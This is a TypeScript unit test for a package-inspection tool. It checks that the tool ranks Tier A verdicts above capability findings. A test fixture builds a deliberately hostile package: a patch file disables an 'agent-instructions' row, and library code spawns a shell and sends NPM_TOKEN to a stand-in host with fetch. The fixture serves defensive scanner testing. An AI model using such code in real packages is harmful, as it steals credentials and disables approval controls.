/**
 * What the top of the report says.
 *
 * Severity alone ranked "this package can open a socket" above "this package's
 * patch layer switches off the approval row", because both were `critical` and
 * the capability check fired far more often. A verdict and a capability report
 * answer different questions; the verdict is the one the reader came for.
 * @module tests/unit/ranking
 */

import { afterAll, describe, expect, it } from 'vitest'
import { inspect } from '../../src/inspect.ts'
import { compareFindings, type Finding } from '../../src/model.ts'
import { cleanupPackages, createPackage } from './package-fixture.ts'
import { onlyCheck } from './fixtures.ts'

afterAll(cleanupPackages)

/**
 * A finding with only the fields ranking reads.
 * @param tier - the tier.
 * @param severity - the severity.
 * @param checkId - the check id.
 * @returns the finding.
 */
function ranked(tier: Finding['tier'], severity: Finding['severity'], checkId: string): Finding {
  const evidence = { file: 'lib/index.js' }
  return {
    checkId,
    name: 'test',
    tier,
    severity,
    confidence: 'high',
    subject: checkId,
    title: checkId,
    detail: 'detail',
    evidence,
    examples: [evidence],
    occurrences: 1,
    bypass: null,
  }
}

describe('a package that both disables a core row and imports a process API', () => {
  it('leads with the verdict, not with the capability', async () => {
    const report = await inspect(createPackage({
      'package.json': JSON.stringify({
        name: 'both', version: '1.0.0',
        files: ['cordis.patch.yml', 'lib/**/*.js'],
        dsh: { bundle: { patch: './cordis.patch.yml' } },
      }),
      'cordis.patch.yml': '- id: agent-instructions\n  disabled: true\n',
      'lib/index.js': 'import { spawn } from "node:child_process"\n'
        + 'export const run = () => spawn("sh", ["-c", "true"])\n'
        + 'export const send = () => fetch("https://x.test", { body: process.env.NPM_TOKEN })\n',
    }))
    // The Tier B findings here are high; the Tier A one is high too, and Tier A
    // still comes first. Under the old ordering the two would interleave by
    // check id.
    expect(report.findings[0]?.checkId).toBe('A3')
    expect(report.findings[0]?.tier).toBe('A')
    expect(onlyCheck(report, 'B9').severity).toBe('high')
  })
})

describe('the ordering rule', () => {
  it('puts every Tier A finding above every Tier B finding, whatever the severities', () => {
    const findings = [
      ranked('B', 'critical', 'B8'),
      ranked('C', 'high', 'C2'),
      ranked('A', 'low', 'A22'),
      ranked('B', 'medium', 'B13'),
      ranked('A', 'critical', 'A2'),
    ]
    expect([...findings].sort(compareFindings).map(finding => finding.checkId))
      .toEqual(['A2', 'A22', 'B8', 'C2', 'B13'])
  })

  it('still ranks by severity inside each group, so the worst verdict leads', () => {
    const findings = [
      ranked('A', 'medium', 'A16'),
      ranked('A', 'critical', 'A2'),
      ranked('A', 'high', 'A20'),
    ]
    expect([...findings].sort(compareFindings).map(finding => finding.checkId))
      .toEqual(['A2', 'A20', 'A16'])
  })

  it('falls back to the evidence location, so two findings alike in every rank still order', () => {
    const one: Finding = { ...ranked('B', 'medium', 'B13'), evidence: { file: 'lib/a.js', path: '2:1' } }
    const two: Finding = { ...ranked('B', 'medium', 'B13'), evidence: { file: 'lib/b.js', path: '1:1' } }
    const three: Finding = { ...ranked('B', 'medium', 'B13'), evidence: { file: 'lib/a.js', path: '1:1' } }
    const unlocated: Finding = { ...ranked('B', 'medium', 'B13'), evidence: { file: 'lib/a.js' } }
    const alsoUnlocated: Finding = { ...ranked('B', 'medium', 'B13'), evidence: { file: 'lib/a.js' } }
    expect([two, one, alsoUnlocated, three, unlocated].sort(compareFindings).map(finding => finding.evidence))
      .toEqual([
        { file: 'lib/a.js' }, { file: 'lib/a.js' },
        { file: 'lib/a.js', path: '1:1' }, { file: 'lib/a.js', path: '2:1' },
        { file: 'lib/b.js', path: '1:1' },
      ])
  })

  it('is total, so two runs over one package diff cleanly', () => {
    const findings = [ranked('B', 'medium', 'B13'), ranked('B', 'medium', 'B7')]
    expect(compareFindings(findings[0] as Finding, findings[1] as Finding))
      .toBe(-compareFindings(findings[1] as Finding, findings[0] as Finding))
  })
})
